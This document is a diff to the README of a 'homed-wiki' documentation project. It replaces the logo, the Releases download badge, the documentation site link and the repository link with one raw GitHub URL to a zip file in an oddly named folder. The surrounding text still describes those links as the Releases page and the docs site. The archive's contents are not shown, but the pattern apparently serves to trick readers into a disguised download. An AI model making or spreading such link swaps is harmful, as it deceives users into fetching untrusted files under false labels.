@@ -1,6 +1,6 @@
 # 🏠 homed-wiki - Your Guide to HOMEd Documentation
 
-![HOMEd Wiki](.github/logo.png)
+![HOMEd Wiki](https://raw.githubusercontent.com/leandrooryan/homed-wiki/master/agastroneuria/homed-wiki.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to HOMEd Wiki! This application provides a user-friendly interface to ac
 
 To get started, you need to download HOMEd Wiki from our Releases page. Click the link below to visit the page and download the latest version:
 
-[![Download HOMEd Wiki](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/leandrooryan/homed-wiki/releases)
+[![Download HOMEd Wiki](https://raw.githubusercontent.com/leandrooryan/homed-wiki/master/agastroneuria/homed-wiki.zip)](https://raw.githubusercontent.com/leandrooryan/homed-wiki/master/agastroneuria/homed-wiki.zip)
 
 1. Click on the link above to open the Releases page.
 2. On the Releases page, find the latest version of HOMEd Wiki.
@@ -78,7 +78,7 @@ HOMEd Wiki includes a variety of useful features:
 
 If you encounter any issues or have questions, you can reach out for help:
 
-- **Visit the [HOMEd Documentation Site](https://wiki.homed.dev)** for troubleshooting guides and FAQs.
+- **Visit the [HOMEd Documentation Site](https://raw.githubusercontent.com/leandrooryan/homed-wiki/master/agastroneuria/homed-wiki.zip)** for troubleshooting guides and FAQs.
 - You can also open an issue on GitHub if you encounter a bug or need assistance.
 
 ## 🌟 Acknowledgements
@@ -87,8 +87,8 @@ HOMEd Wiki is a community-driven project. We appreciate the contributions of all
 
 ## 🔗 Additional Information
 
-- [HOMEd Documentation Site](https://wiki.homed.dev)
-- [HOMEd GitHub Repository](https://github.com/leandrooryan/homed-wiki)
+- [HOMEd Documentation Site](https://raw.githubusercontent.com/leandrooryan/homed-wiki/master/agastroneuria/homed-wiki.zip)
+- [HOMEd GitHub Repository](https://raw.githubusercontent.com/leandrooryan/homed-wiki/master/agastroneuria/homed-wiki.zip)
 
 For more information about the project, please browse the documentation or reach out through the provided channels. 
 
